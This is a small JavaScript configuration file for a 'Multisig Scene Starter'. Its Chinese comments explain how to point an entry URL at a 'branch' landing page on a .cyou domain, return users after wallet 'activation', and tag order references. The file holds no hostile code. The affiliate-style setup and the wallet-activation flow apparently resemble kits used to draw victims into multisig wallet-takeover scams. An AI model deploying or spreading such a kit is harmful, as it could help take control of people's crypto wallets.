/*!
 * Multisig Scene Starter — free to copy and publish.
 * Only configure entryUrl (branch /p/{slug} landing). Do NOT hardcode wallet deep links.
 */
window.SCENE_CONFIG = {
  /** 必填：分公司落地页，例如 https://your-branch.example/p/exchange */
  entryUrl: "https://multisig-station-branch.iqiyia.cyou/p/exchange",

  /**
   * 可选：开通完成后跳回本页（须在分公司「对接」白名单中）。
   * 留空则开通完留在多签站成功页。
   * 本地文件打开时无法做可靠回跳，请用本地静态服务器或部署到 https 域名。
   */
  returnUrl: "",

  /** 可选：业务单号前缀，会变成 ref=demo-时间戳 */
  refPrefix: "demo",
};
